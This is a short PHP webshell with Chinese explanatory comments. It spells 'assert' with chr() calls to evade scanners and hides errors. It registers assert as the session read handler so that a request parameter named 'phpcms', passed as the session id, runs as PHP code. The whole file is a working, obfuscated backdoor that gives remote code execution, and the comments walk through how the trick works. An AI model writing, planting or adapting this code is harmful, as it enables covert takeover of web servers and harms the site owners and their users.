<?php
error_reporting(0);
if ($_REQUEST['session'] == 1) {
    $session = chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); //assert
    // open第一个被调用，类似 类的构造函数
    function open($save_path, $session_name) {
    }
    // close最后一个被调用，类似 类的析构函数
    function close() {
    }
    // 得到session id后，等价于执行assert($_REQUEST[phpcms])
    session_id($_REQUEST[phpcms]);
    function write($id, $sess_data) {
    }
    function destroy($id) {
    }
    function gc() {
    }
    // 第三个参数为read  read(string $sessionId)
    session_set_save_handler("open", "close", $session, "write", "destroy", "gc");
    @session_start(); //会话打开的时候，自动调用回调函数
    $cloud = $_SESSION["d"] = "c"; // 这句话没用
}
?>
